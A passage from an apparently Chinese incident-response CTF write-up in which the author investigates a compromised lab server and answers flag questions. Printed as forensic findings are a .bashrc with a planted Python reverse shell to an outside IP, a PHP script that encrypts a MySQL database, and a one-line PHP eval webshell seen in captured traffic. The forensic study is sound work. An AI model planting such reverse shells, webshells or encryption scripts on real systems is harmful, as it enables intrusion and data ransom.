class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ubuntu18:~# <span class="hljs-built_in">cat</span> /root/.bashrc<br><span class="hljs-comment"># ~/.bashrc: executed by bash(1) for non-login shells.</span><br><span class="hljs-comment"># see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)</span><br><span class="hljs-comment"># for examples</span><br><br><span class="hljs-comment"># If not running interactively, don&#x27;t do anything</span><br>[ -z <span class="hljs-string">&quot;<span class="hljs-variable">$PS1</span>&quot;</span> ] &amp;&amp; <span class="hljs-built_in">return</span><br><br><span class="hljs-comment"># don&#x27;t put duplicate lines in the history. See bash(1) for more options</span><br><span class="hljs-comment"># ... or force ignoredups and ignorespace</span><br>HISTCONTROL=ignoredups:ignorespace<br><br><span class="hljs-comment"># append to the history file, don&#x27;t overwrite it</span><br><span class="hljs-built_in">shopt</span> -s histappend<br><br><span class="hljs-comment"># for setting history length see HISTSIZE and HISTFILESIZE in bash(1)</span><br>HISTSIZE=1000<br>HISTFILESIZE=2000<br><br><span class="hljs-comment"># check the window size after each command and, if necessary,</span><br><span class="hljs-comment"># update the values of LINES and COLUMNS.</span><br><span class="hljs-built_in">shopt</span> -s checkwinsize<br><br><span class="hljs-comment"># make less more friendly for non-text input files, see lesspipe(1)</span><br>[ -x /usr/bin/lesspipe ] &amp;&amp; <span class="hljs-built_in">eval</span> <span class="hljs-string">&quot;<span class="hljs-subst">$(SHELL=/bin/sh lesspipe)</span>&quot;</span><br><br><span class="hljs-comment"># set variable identifying the chroot you work in (used in the prompt below)</span><br><span class="hljs-keyword">if</span> [ -z <span class="hljs-string">&quot;<span class="hljs-variable">$debian_chroot</span>&quot;</span> ] &amp;&amp; [ -r /etc/debian_chroot ]; <span class="hljs-keyword">then</span><br>    debian_chroot=$(<span class="hljs-built_in">cat</span> /etc/debian_chroot)<br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment"># set a fancy prompt (non-color, unless we know we &quot;want&quot; color)</span><br><span class="hljs-keyword">case</span> <span class="hljs-string">&quot;<span class="hljs-variable">$TERM</span>&quot;</span> <span class="hljs-keyword">in</span><br>    xterm-color) color_prompt=<span class="hljs-built_in">yes</span>;;<br><span class="hljs-keyword">esac</span><br><br><span class="hljs-comment"># uncomment for a colored prompt, if the terminal has the capability; turned</span><br><span class="hljs-comment"># off by default to not distract the user: the focus in a terminal window</span><br><span class="hljs-comment"># should be on the output of commands, not on the prompt</span><br><span class="hljs-comment">#force_color_prompt=yes</span><br><br><span class="hljs-keyword">if</span> [ -n <span class="hljs-string">&quot;<span class="hljs-variable">$force_color_prompt</span>&quot;</span> ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-keyword">if</span> [ -x /usr/bin/tput ] &amp;&amp; tput setaf 1 &gt;&amp;/dev/null; <span class="hljs-keyword">then</span><br>        <span class="hljs-comment"># We have color support; assume it&#x27;s compliant with Ecma-48</span><br>        <span class="hljs-comment"># (ISO/IEC-6429). (Lack of such support is extremely rare, and such</span><br>        <span class="hljs-comment"># a case would tend to support setf rather than setaf.)</span><br>        color_prompt=<span class="hljs-built_in">yes</span><br>    <span class="hljs-keyword">else</span><br>        color_prompt=<br>    <span class="hljs-keyword">fi</span><br><span class="hljs-keyword">fi</span><br>python -c <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;124.221.70.199&quot;,9919));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span> &amp;<br><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$color_prompt</span>&quot;</span> = <span class="hljs-built_in">yes</span> ]; <span class="hljs-keyword">then</span><br>    PS1=<span class="hljs-string">&#x27;$&#123;debian_chroot:+($debian_chroot)&#125;\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ &#x27;</span><br><span class="hljs-keyword">else</span><br>    PS1=<span class="hljs-string">&#x27;$&#123;debian_chroot:+($debian_chroot)&#125;\u@\h:\w\$ &#x27;</span><br><span class="hljs-keyword">fi</span><br><span class="hljs-built_in">unset</span> color_prompt force_color_prompt<br><br><span class="hljs-comment"># If this is an xterm set the title to user@host:dir</span><br><span class="hljs-keyword">case</span> <span class="hljs-string">&quot;<span class="hljs-variable">$TERM</span>&quot;</span> <span class="hljs-keyword">in</span><br>xterm*|rxvt*)<br>    PS1=<span class="hljs-string">&quot;\[\e]0;<span class="hljs-variable">$&#123;debian_chroot:+($debian_chroot)&#125;</span>\u@\h: \w\a\]<span class="hljs-variable">$PS1</span>&quot;</span><br>    ;;<br>*)<br>    ;;<br><span class="hljs-keyword">esac</span><br><br><span class="hljs-comment"># enable color support of ls and also add handy aliases</span><br><span class="hljs-keyword">if</span> [ -x /usr/bin/dircolors ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">test</span> -r ~/.dircolors &amp;&amp; <span class="hljs-built_in">eval</span> <span class="hljs-string">&quot;<span class="hljs-subst">$(dircolors -b ~/.dircolors)</span>&quot;</span> || <span class="hljs-built_in">eval</span> <span class="hljs-string">&quot;<span class="hljs-subst">$(dircolors -b)</span>&quot;</span><br>    <span class="hljs-built_in">alias</span> <span class="hljs-built_in">ls</span>=<span class="hljs-string">&#x27;ls --color=auto&#x27;</span><br>    <span class="hljs-comment">#alias dir=&#x27;dir --color=auto&#x27;</span><br>    <span class="hljs-comment">#alias vdir=&#x27;vdir --color=auto&#x27;</span><br><br>    <span class="hljs-built_in">alias</span> grep=<span class="hljs-string">&#x27;grep --color=auto&#x27;</span><br>    <span class="hljs-built_in">alias</span> fgrep=<span class="hljs-string">&#x27;fgrep --color=auto&#x27;</span><br>    <span class="hljs-built_in">alias</span> egrep=<span class="hljs-string">&#x27;egrep --color=auto&#x27;</span><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment"># some more ls aliases</span><br><span class="hljs-built_in">alias</span> ll=<span class="hljs-string">&#x27;ls -alF&#x27;</span><br><span class="hljs-built_in">alias</span> la=<span class="hljs-string">&#x27;ls -A&#x27;</span><br><span class="hljs-built_in">alias</span> l=<span class="hljs-string">&#x27;ls -CF&#x27;</span><br><br><span class="hljs-comment"># Alias definitions.</span><br><span class="hljs-comment"># You may want to put all your additions into a separate file like</span><br><span class="hljs-comment"># ~/.bash_aliases, instead of adding them here directly.</span><br><span class="hljs-comment"># See /usr/share/doc/bash-doc/examples in the bash-doc package.</span><br><br><span class="hljs-keyword">if</span> [ -f ~/.bash_aliases ]; <span class="hljs-keyword">then</span><br>    . ~/.bash_aliases<br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment"># enable programmable completion features (you don&#x27;t need to enable</span><br><span class="hljs-comment"># this, if it&#x27;s already enabled in /etc/bash.bashrc and /etc/profile</span><br><span class="hljs-comment"># sources /etc/bash.bashrc).</span><br><span class="hljs-comment">#if [ -f /etc/bash_completion ] &amp;&amp; ! shopt -oq posix; then</span><br><span class="hljs-comment">#    . /etc/bash_completion</span><br><span class="hljs-comment">#fi</span><br>root@ubuntu18:~# <span class="hljs-built_in">md5sum</span>  /root/.bashrc<br>4acc9c465eeeb139c194893ec0a8bcbc  /root/.bashrc<br></code></pre></td></tr></table></figure>
<h2 id="q8-3"><a class="markdownIt-Anchor" href="#q8-3"></a> Q8</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">攻击者加密了哪个数据库？提交数据库的文件夹名，例如user数据库对应存放位置为user文件夹，上传字符串&quot;user&quot;的小写md5值，格式flag&#123;md5&#125;。<br></code></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ubuntu18:/var/www/html/include# <span class="hljs-built_in">cat</span> config.inc.php<br>&lt;?php<br>// Coppermine configuration file<br>// Database configuration<br><span class="hljs-variable">$CONFIG</span>[<span class="hljs-string">&#x27;dbtype&#x27;</span>] =       <span class="hljs-string">&#x27;pdo:mysql&#x27;</span>;                  // Your database <span class="hljs-built_in">type</span><br><span class="hljs-variable">$CONFIG</span>[<span class="hljs-string">&#x27;dbserver&#x27;</span>] =     <span class="hljs-string">&#x27;localhost&#x27;</span>;                  // Your database server<br><span class="hljs-variable">$CONFIG</span>[<span class="hljs-string">&#x27;dbuser&#x27;</span>] =       <span class="hljs-string">&#x27;root&#x27;</span>;                       // Your database username<br><span class="hljs-variable">$CONFIG</span>[<span class="hljs-string">&#x27;dbpass&#x27;</span>] =       <span class="hljs-string">&#x27;mysql123&#x27;</span>;                   // Your database password<br><span class="hljs-variable">$CONFIG</span>[<span class="hljs-string">&#x27;dbname&#x27;</span>] =       <span class="hljs-string">&#x27;mirage&#x27;</span>;                     // Your database name<br><br>// DATABASE TABLE NAMES PREFIX<br><span class="hljs-variable">$CONFIG</span>[<span class="hljs-string">&#x27;TABLE_PREFIX&#x27;</span>] =                  <span class="hljs-string">&#x27;cpg16x_&#x27;</span>;root@ubuntu18:/var/www/html/include# <br></code></pre></td></tr></table></figure>
<p>用navicat连接一下发现chase这个是打不开的</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ubuntu18:~# find / -name JPMorgan@0020Chase<br><br>/var/lib/mysql/JPMorgan@0020Chase<br>root@ubuntu18:~# <br>root@ubuntu18:~# <span class="hljs-built_in">md5sum</span> /var/lib/mysql/JPMorgan@0020Chase<br><span class="hljs-built_in">md5sum</span>: /var/lib/mysql/JPMorgan@0020Chase: Is a directory<br>root@ubuntu18:~# <span class="hljs-built_in">cat</span> /var/lib/mysql/JPMorgan@0020Chase<br><span class="hljs-built_in">cat</span>: /var/lib/mysql/JPMorgan@0020Chase: Is a directory<br>root@ubuntu18:~# <span class="hljs-built_in">ls</span><br>root@ubuntu18:~# <span class="hljs-built_in">ls</span> /<br>bin    etc             lib         mnt   run   swap.img  var<br>boot   home            lib64       opt   sbin  sys       vmlinuz<br>cdrom  initrd.img      lost+found  proc  snap  tmp       vmlinuz.old<br>dev    initrd.img.old  media       root  srv   usr       wireshark.pcap<br>root@ubuntu18:~# <span class="hljs-built_in">echo</span> -n <span class="hljs-string">&quot;JPMorgan@0020Chase&quot;</span> | <span class="hljs-built_in">md5sum</span><br>0928a5424aa6126e5923980ca103560e  -<br></code></pre></td></tr></table></figure>
<h2 id="q9-2"><a class="markdownIt-Anchor" href="#q9-2"></a> Q9</h2>
<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q">解密数据库，提交Harper用户对应Areer的值。提交Areer值的小写<span class="hljs-built_in">md5</span>值，格式flag&#123;<span class="hljs-built_in">md5</span>&#125;。<br></code></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ubuntu18:~# find / -<span class="hljs-built_in">type</span> f -newer /var/www/html/plugins/cpg.php ! -newer /var/lib/mysql/JPMorgan@0020Chase/Balance.frm<br>find: ‘/proc/1980/task/1980/fdinfo/6’: No such file or directory<br>find: ‘/proc/1980/fdinfo/5’: No such file or directory<br>/var/log/unattended-upgrades/unattended-upgrades-dpkg.log<br>/var/log/journal/2bc98b82d1f84854bf5a0e90f0541f93/system@8d0a07018d4d41b185acc80dccc9f355-000000000000050d-0005f993cd1ee382.journal<br>/var/log/journal/2bc98b82d1f84854bf5a0e90f0541f93/system@8d0a07018d4d41b185acc80dccc9f355-0000000000000f90-00060a67b8d79061.journal<br>/var/log/tallylog<br>/var/log/apache2/access.log<br>/var/lib/mysql/clockup.php<br>/var/lib/mysql/mysql/innodb_index_stats.ibd<br>/var/lib/mysql/mysql/innodb_table_stats.ibd<br>/var/lib/mysql/mirage/cpg16x_config.ibd<br>/var/lib/mysql/mirage/cpg16x_users.ibd<br>/var/lib/mysql/mirage/cpg16x_banned.ibd<br>/var/lib/mysql/mirage/cpg16x_temp_messages.ibd<br>/var/lib/mysql/mirage/cpg16x_sessions.ibd<br>/var/lib/mysql/JPMorgan@0020Chase/Balance.frm<br>/var/lib/mysql/JPMorgan@0020Chase/UserIdentity.ibd<br>/var/lib/mysql/JPMorgan@0020Chase/Balance.ibd<br>/var/lib/mysql/JPMorgan@0020Chase/UserIdentity.frm<br>/var/lib/mysql/JPMorgan@0020Chase/db.opt<br>/var/www/html/logs/security.log.php<br>/etc/gshadow<br>/etc/subuid<br>/etc/passwd<br>/etc/profile<br>/etc/subgid<br>/etc/group<br>/etc/shadow<br>/root/.bashrc<br></code></pre></td></tr></table></figure>
<ul>
<li><code>-newer /var/www/html/plugins/cpg.php</code>: 找出比这个文件新的文件。</li>
<li><code>! -newer /var/lib/mysql/JPMorgan@0020Chase/Balance.frm</code>: 找出比这个文件旧的文件。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ubuntu18:~# <span class="hljs-built_in">cat</span> /var/lib/mysql/clockup.php<br>&lt;?php<br><span class="hljs-variable">$currentDate</span> = <span class="hljs-built_in">date</span>(<span class="hljs-string">&quot;Y-m-d&quot;</span>);<br><span class="hljs-variable">$key</span> = md5(<span class="hljs-variable">$currentDate</span>);<br><span class="hljs-variable">$iv</span> = substr(<span class="hljs-built_in">hash</span>(<span class="hljs-string">&#x27;sha256&#x27;</span>, <span class="hljs-string">&quot;DeepMountainsGD&quot;</span>), 0, 16);<br><span class="hljs-variable">$filePath</span> = <span class="hljs-string">&quot;/var/lib/mysql/JPMorgan@0020Chase&quot;</span>;<br><span class="hljs-variable">$files</span> = scandir(<span class="hljs-variable">$filePath</span>);<br>foreach (<span class="hljs-variable">$files</span> as <span class="hljs-variable">$file</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span> != <span class="hljs-string">&quot;.&quot;</span> &amp;&amp; <span class="hljs-variable">$file</span> != <span class="hljs-string">&quot;..&quot;</span>) &#123;<br>        <span class="hljs-variable">$fullPath</span> = <span class="hljs-variable">$filePath</span> . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$file</span>;<br>        <span class="hljs-variable">$content</span> = file_get_contents(<span class="hljs-variable">$fullPath</span>);<br>        <span class="hljs-variable">$encryptedContent</span> = openssl_encrypt(<span class="hljs-variable">$content</span>, <span class="hljs-string">&#x27;aes-256-cbc&#x27;</span>, <span class="hljs-variable">$key</span>, 0, <span class="hljs-variable">$iv</span>);<br>        file_put_contents(<span class="hljs-variable">$fullPath</span>, <span class="hljs-variable">$encryptedContent</span>);<br>    &#125;<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure>
<p>ai解密一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 需要用户输入加密日期</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;请输入加密发生的日期（格式：YYYY-MM-DD）: &quot;</span>;<br><span class="hljs-variable">$encryptedDate</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-title function_ invoke__">fgets</span>(STDIN));<br><br><span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$encryptedDate</span>);<br><span class="hljs-variable">$iv</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">hash</span>(<span class="hljs-string">&#x27;sha256&#x27;</span>, <span class="hljs-string">&quot;DeepMountainsGD&quot;</span>), <span class="hljs-number">0</span>, <span class="hljs-number">16</span>); <span class="hljs-comment">// 修正拼写为实际值</span><br><br><span class="hljs-variable">$filePath</span> = <span class="hljs-string">&quot;/var/lib/mysql/JPMorgan@0020Chase&quot;</span>;<br><span class="hljs-variable">$files</span> = <span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-variable">$filePath</span>);<br><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span> != <span class="hljs-string">&quot;.&quot;</span> &amp;&amp; <span class="hljs-variable">$file</span> != <span class="hljs-string">&quot;..&quot;</span>) &#123;<br>        <span class="hljs-variable">$fullPath</span> = <span class="hljs-variable">$filePath</span> . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$file</span>;<br>        <span class="hljs-variable">$encryptedContent</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$fullPath</span>);<br>        <span class="hljs-variable">$decryptedContent</span> = <span class="hljs-title function_ invoke__">openssl_decrypt</span>(<span class="hljs-variable">$encryptedContent</span>, <span class="hljs-string">&#x27;aes-256-cbc&#x27;</span>, <span class="hljs-variable">$key</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$iv</span>);<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$fullPath</span>, <span class="hljs-variable">$decryptedContent</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;已解密文件: <span class="hljs-subst">$fullPath</span>\n&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;解密完成！\n&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>查一下时间，然后解密</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ubuntu18:~# php 123.php<br>请输入加密发生的日期（格式：YYYY-MM-DD）: 2023-11-18<br>已解密文件: /var/lib/mysql/JPMorgan@0020Chase/Balance.frm<br>已解密文件: /var/lib/mysql/JPMorgan@0020Chase/Balance.ibd<br>已解密文件: /var/lib/mysql/JPMorgan@0020Chase/UserIdentity.frm<br>已解密文件: /var/lib/mysql/JPMorgan@0020Chase/UserIdentity.ibd<br>已解密文件: /var/lib/mysql/JPMorgan@0020Chase/db.opt<br>解密完成！<br></code></pre></td></tr></table></figure>
<p>重启一下数据库</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> systemctl restart mysql<br></code></pre></td></tr></table></figure>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">Chef</span><br>8FD82B8864D71ED7FA12B59E6E34CD1C<br></code></pre></td></tr></table></figure>
<p><img src="/../../images/%E7%8E%84%E6%9C%BA/2025-03-06202650.png" srcset="/img/loading.gif" lazyload alt="2025-03-06202650"></p>
<h1 id="blue-team2为什么没有"><a class="markdownIt-Anchor" href="#blue-team2为什么没有"></a> blue team2为什么没有！！！</h1>
<p>(为什么2没有，因为太菜了看了一下wp觉得我基础知识不好，之后学好了相关知识会补:)</p>
<h2 id="q10-2"><a class="markdownIt-Anchor" href="#q10-2"></a> Q10</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">因为什么文件中的漏洞配置，导致了攻击者成功执行命令并提权。提交该文件的小写md5值，格式flag&#123;md5&#125;。<br></code></pre></td></tr></table></figure>
<p>suid找一下权限，下面的sudo是最近有改动的</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ubuntu18:~# find / -perm -4000 -<span class="hljs-built_in">type</span> f -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">ls</span> -la &#123;&#125; 2&gt;/dev/null \;<br>-rwsr-xr-x 1 root root 14328 Jan 12  2022 /usr/lib/policykit-1/polkit-agent-helper-1<br>-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device<br>-rwsr-xr-- 1 root messagebus 42992 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>-rwsr-xr-x 1 root root 130264 May 29  2023 /usr/lib/snapd/snap-confine<br>-rwsr-xr-x 1 root root 100760 Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic<br>-rwsr-xr-x 1 root root 436552 Aug 11  2021 /usr/lib/openssh/ssh-keysign<br>-rwsr-xr-x 1 root root 75824 Nov 29  2022 /usr/bin/gpasswd<br>-rwsr-xr-x 1 root root 18448 Jun 28  2019 /usr/bin/traceroute6.iputils<br>-rwsr-sr-x 1 daemon daemon 51464 Feb 20  2018 /usr/bin/at<br>-rwsr-xr-x 1 root root 22520 Jan 12  2022 /usr/bin/pkexec<br>-rwsr-xr-x 1 root root 59640 Nov 29  2022 /usr/bin/passwd<br>-rwsr-xr-x 1 root root 37136 Nov 29  2022 /usr/bin/newuidmap<br>-rwsr-xr-x 1 root root 149080 Apr  4  2023 /usr/bin/sudo<br>-rwsr-xr-x 1 root root 40344 Nov 29  2022 /usr/bin/newgrp<br>-rwsr-xr-x 1 root root 37136 Nov 29  2022 /usr/bin/newgidmap<br>-rwsr-xr-x 1 root root 44528 Nov 29  2022 /usr/bin/chsh<br>-rwsr-xr-x 1 root root 76496 Nov 29  2022 /usr/bin/chfn<br>-rwsr-xr-x 1 root root 26696 Sep 16  2020 /bin/umount<br>-rwsr-xr-x 1 root root 44664 Nov 29  2022 /bin/su<br>-rwsr-xr-x 1 root root 64424 Jun 28  2019 /bin/ping<br>-rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount<br>-rwsr-xr-x 1 root root 43088 Sep 16  2020 /bin/mount<br></code></pre></td></tr></table></figure>
<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">-rwsr-xr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 149080 </span>Apr <span class="hljs-number"> 4 </span><span class="hljs-number"> 2023 </span>/usr/bin/sudo<br></code></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ubuntu18:~# <span class="hljs-built_in">md5sum</span> /etc/sudoers<br>6585817513b0ea96707ebb0d04d6aeff  /etc/sudoers<br></code></pre></td></tr></table></figure>
<p><img src="/../../images/%E7%8E%84%E6%9C%BA/2025-03-06202915.png" srcset="/img/loading.gif" lazyload alt="2025-03-06202915"></p>
<h1 id="第九章-blueteam-的小心思3"><a class="markdownIt-Anchor" href="#第九章-blueteam-的小心思3"></a> 第九章-blueteam 的小心思3</h1>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 审计日志，攻击者下载恶意木马文件的 ip是多少 flag&#123;ip&#125;<br><span class="hljs-bullet">2.</span> 审计流量包，木马文件连接密码是什么? flag&#123;xxx&#125;<br><span class="hljs-bullet">3.</span> 审计流量包，攻击者反弹的IP和端口是什么? flag&#123;ip:port&#125;<br><span class="hljs-bullet">4.</span> 提交黑客上传恶意文件的 md5 md5sum xxx.so<br><span class="hljs-bullet">5.</span> 攻击者在服务器内权限维持请求外部地址和恶意文件的地址 flag&#123;http://xxxxxxxxxx/xx.xxx&#125;<br></code></pre></td></tr></table></figure>
<h2 id="q1-21"><a class="markdownIt-Anchor" href="#q1-21"></a> Q1</h2>
<p>下载通常使用的方法是nc的远程上传，curl的发包，以及已经shell的直接上传，在数据包里找curl就行，直接翻到最后</p>
<p><img src="/../../images/%E7%8E%84%E6%9C%BA/2025-03-05212604.png" srcset="/img/loading.gif" lazyload alt="2025-03-05212604"></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">192.168.150.253</span>&#125;<br></code></pre></td></tr></table></figure>
<h2 id="q2-21"><a class="markdownIt-Anchor" href="#q2-21"></a> Q2</h2>
<p>TCP追踪</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/shell.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.150.253:8080<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>curl/7.64.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">0</span>.<span class="hljs-number">000748</span>s</span><br><span class="language-apache"><span class="hljs-attribute">HTTP</span>/<span class="hljs-number">1</span>.<span class="hljs-number">0</span> <span class="hljs-number">200</span> OK</span><br><span class="language-apache"><span class="hljs-attribute">Server</span>: SimpleHTTP/<span class="hljs-number">0</span>.<span class="hljs-number">6</span> Python/<span class="hljs-number">3</span>.<span class="hljs-number">11</span>.<span class="hljs-number">5</span></span><br><span class="language-apache"><span class="hljs-attribute">Date</span>: Thu, <span class="hljs-number">21</span> Dec <span class="hljs-number">2023</span> <span class="hljs-number">06</span>:<span class="hljs-number">39</span>:<span class="hljs-number">58</span> GMT</span><br><span class="language-apache"><span class="hljs-attribute">Content</span>-type: application/octet-stream</span><br><span class="language-apache"><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">31</span></span><br><span class="language-apache"><span class="hljs-attribute">Last</span>-Modified: Thu, <span class="hljs-number">21</span> Dec <span class="hljs-number">2023</span> <span class="hljs-number">06</span>:<span class="hljs-number">25</span>:<span class="hljs-number">03</span> GMT</span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-section">&lt;?php @eval($_POST[&#x27;cmd&#x27;]); ?&gt;</span></span><br><span class="language-apache"></span><br></code></pre></td></tr></table></figure>
<p><code>flag&#123;cmd&#125;</code></p>
<h2 id="q3-21"><a class="markdownIt-Anchor" href="#q3-21"></a> Q3</h2>
